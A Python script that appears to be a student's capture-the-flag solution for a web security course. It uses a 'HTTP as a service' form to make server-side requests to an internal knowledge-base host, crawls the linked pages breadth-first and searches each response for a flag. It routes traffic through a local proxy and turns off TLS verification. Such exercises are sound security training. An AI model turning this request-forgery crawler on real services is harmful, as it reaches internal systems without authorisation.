import requests
import re

proxies = {
  'https': 'http://127.0.0.1:8080',
}


queue = [""]
explored = set()
#simple BFS
def spiderman():
    while queue:
        url = queue.pop(0)
        if url in explored:
          continue
        explored.add(url)
        url = url[6:-1]
        if url and url[0] =="/":
          url = url[1:]
        print("Test","https://haas-v3.quoccacorp.com/" + url)
        headers = {
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://haas-v3.quoccacorp.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://haas-v3.quoccacorp.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i",
        }
        data = {
    "requestBox": f"GET /{url} HTTP/1.1\r\n"
                  "Host: kb.quoccacorp.com\r\n"
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                  "Accept-Language: en-US,en;q=0.5\r\n"
                  "Referer: http://haas.quoccacorp.com/\r\n"
                  "Content-Type: application/x-www-form-urlencoded\r\n"
                  "Content-Length: 0\r\n"
                  "Origin: http://haas.quoccacorp.com\r\n"
                  "Connection: keep-alive\r\n"
                  "\r\n"
}
        print(data)
        r = requests.post("https://haas-v3.quoccacorp.com/", headers=headers,data=data,proxies=proxies, verify=False)
        flag = re.search(r"COMP6443\{.*?\}",r.text)
        if flag:
          return flag.group(0)
        results = re.findall("href=\"[^\"]*\"", r.text)
        print(results)
        queue.extend(results)



print(spiderman())


#r = requests.post("https://haas-v3.quoccacorp.com/",headers=headers,data=data, proxies=proxies, verify=False)
#print(r.text)